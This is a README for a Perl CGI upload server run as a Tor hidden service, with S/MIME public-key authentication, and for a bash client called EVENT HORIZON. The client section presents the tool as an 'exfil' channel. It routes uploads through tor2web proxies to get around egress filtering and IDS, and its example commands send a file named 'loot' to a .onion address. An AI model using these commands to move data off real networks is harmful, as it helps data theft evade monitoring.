# BLACK HOLE

Is a perl cgi file upload web app that is built to function easily with 
curl and the use of html forms is not required or needed. It is made 
to be used as a TOR hidden service.

The difference of this cgi upload app from others is that 
it uses OpenSSL public key encryption for authentication. The 
purchase of a cert from a CA is not needed or recommened as those 
orginizations personal regard for you is dubious.

Since these certs are not used for establishing SSL sessions only for
file encryption. It is best in my opinion to create the keypair you need 
and only give out copies of the public key to the indivduals you 
personaly trust.

And by give I mean hand it to them, DONT email.

## Installing
The install process will get lighttpd and tor through apt and configure them.
It wiil also will place the cgi in the correct location, so dont wory 
about that.

You will also be prompted to input the authentication passphrase.

The .onion hostname will be shown upon completion.

Run as root

```
root@null:~/black-hole# ./install-bh.sh
```
The private key is required to be in the directory /var/cp-data/auth/
for this cgi to function.


### Explanation

A breakdown of the cgi will follow but it still does not beat reading
the Perl cgi itself. Plus eventhough it's Perl I avoided using obscure 
code and kept it simple so that a sysadmin that doesn't program should 
be able to break it down after some reading.

To understand how the authentication is performed, I first have to point
out the folders in use by this cgi.

NOTE: These will be generated by the installer, you will be 
prompted for the passphrase.

The required folders are placed in /var/. 

```
         /var/cp-data/
                 └── auth/
                       ├── pphrase
                       └── private.pem
```

The owner for cp-data/ and it's subdirectories is "www-data".

cp-data/ is the main folder which will contain the uploaded data. The 
sub folder auth/ MUST contain the private key along with a passphrase
or a hash of a passphrase which is interpreted by the cgi as a string
to see if it matches with an authentication parameter posted to it.

keep this in mind.

The cgi has three parameters that need to be filled and each need to be 
processed successfully otherwise the cgi will exit. They are proccesed 
in a sequential manner.

NOTE: for those that do not wish to craft your own url requestes 
and wish to use a more automated method, see EVENT_HORIZON below.


### FIRST parameter
The first parameter is the plain-text or hashed passphrase that is 
encrypted by the corrisponding OpenSSL public key as any SMIME type with
public key encryption.

### OpenSSL smime data, example:

```
MIME-Version: 1.0
Content-Disposition: attachment; filename="smime.p7m"
Content-Type: application/x-pkcs7-mime; smime-type=enveloped-data; name="smime.p7m"
Content-Transfer-Encoding: base64

MIIBxgYJKoZIhvcNAQcDoIIBtzCCAbMCAQAxggFuMIIBagIBADBSMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQCCQDtan1KLnkXHjANBgkqhkiG9w0BAQEFAASCAQAH6f3L
VkTcrGI+oEwIm17wVW1XQTyjd4kxnFTGbc29dPsnW+bymAkzc0Xq9y2hv/+Mdd/i
QHW8m9Sry9jYXLO5mKp2LAEy4q3x6hM5XomV8elgm7ZNriVdWAYztVQ01I+3RnOo
5vqSy3iCfJ4/ecs5/RyE+JLG7269389NTMDigQOY/XqtFOB8dbeQolTanJev6Nxt
cvwapfxFGIs85QIFlQp9c2VP6KCFMk7h4Hyv03pJgWSR2hg7CDjzOfdMsi1WQ92P
TEYIi9n26XXiCUTMLCY8RqJsWlFvhyhW8PXXQy2kC7fn/I+ukcf+qtieEzGVCIOS
gWHEt5k6uWpt43pNMDwGCSqGSIb3DQEHATAdBglghkgBZQMEASoEEPxDoqLGhINJ
ZhF1cyVM0XyAEBLJ3nT17dVtx/E+k3lEw/8=
```

For this parameter to be completed successfully the cgi would have to 
decrypt the SMIME data with the private key and extract the 
passphrase/hash and match this to the passphrase/hash in the 
cp-data/auth/ folder. 


### SECOND parameter
The second parameter contains a one time use random key that is 
encrypted in the same manner as the first parameter(SMIME/AES). This 
one time use passphrase will be used to encrypt/decrypt symmenticly 
the data that is to be uploaded.

For this parameter to be completed successfully the cgi would have to
be able to decrypt this SMIME data with the privated key. The decrypted
passphrase is stored in the same directory as the data that is uploaded,
both share the same time stamp.


### THIRD parameter 
The third parameter will contain the encryped data to be uploaded.
This cgi was made to function in a environment without SSL/TLS session
encryption.



# EVENT HORIZON

A client for one that wishes to upload to BLACK_HOLE. It performs 
the neccesary encryption on the files to be uploaded, then uses curl along 
with OpenSSL and the public key to generate a url post request that 
contains the three required parameters.

The trick is that on top of directly uploading to the cgi over the normal 
Internet. It also has the option to use proxies that serve as hidden service 
gateways such as tor2web. The idea behind it is that the LAN this client may 
be connecting from may have egress filtering rules (IDS/IDPS) that may interfere 
with tor traffic. So this manages to still use tor by first connecting to one 
of these proxies using regular HTTPS that then forward it to your hidden service 
over tor. 

The temporary password for symmetric encryption is generated with 
/dev/urandom and piped into a variable.

```
 TPASS=$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c 30 | base64)
```

Options avaliable by event-horizon client.
```

options:
   -k   location of the public key in pem format for use in encryption
   -t   use tor2web to use exfil hosted on hidden service (yes/no)
   -a   trusted passphrase on the server hosting the cgi perl file
   -d   location of the data file you wish to upload
   -u   full url to the perl cgi upload app, if hidden service place .onion url

usage examples:

without tor:
./event-horizon.sh -k public.pem -a pphrase -t no -d loot -u some_domain.com

using tor tor2web proxies:
./event-horizon.sh -k public.pem -a pphrase -t yes -d loot -u xaede7oiftahtz.onion

```


xor-function at
nightowlconsulting.com
